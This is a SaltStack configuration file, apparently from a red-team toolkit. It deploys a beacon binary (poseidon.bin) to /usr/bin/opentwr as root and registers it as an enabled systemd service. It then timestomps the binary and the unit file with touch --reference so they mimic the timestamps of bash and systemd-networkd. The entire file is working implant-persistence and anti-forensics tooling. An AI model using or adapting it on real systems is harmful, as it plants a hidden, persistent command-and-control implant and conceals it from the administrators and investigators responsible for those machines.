opentwr-service-binary:
  file.managed:
    - source: salt://redteam/beacons/poseidon.bin
    - name: /usr/bin/opentwr
    - mode: '0755'
    - user: root
    - group: root

opentwr-service-file:
  file.managed:
    - source: salt://redteam/linux/services/opentwr.service
    - name: /lib/systemd/system/opentwr.service
    - mode: '0644'
    - user: root
    - group: root

time-stomp-binary:
  cmd.run:
    - name: touch --reference=/usr/bin/bash /usr/bin/opentwr

time-stomp-service:
  cmd.run:
    - name: touch --reference=/lib/systemd/system/systemd-networkd.service /lib/systemd/system/opentwr.service 


reload_daemon:
  cmd.run:
    - name: sudo systemctl daemon-reload

enable_service:
  cmd.run:
    - name: sudo systemctl enable opentwr.service

opentwr-service:
  service.running:
    - name: opentwr.service
    - enable: true
    - reload: true
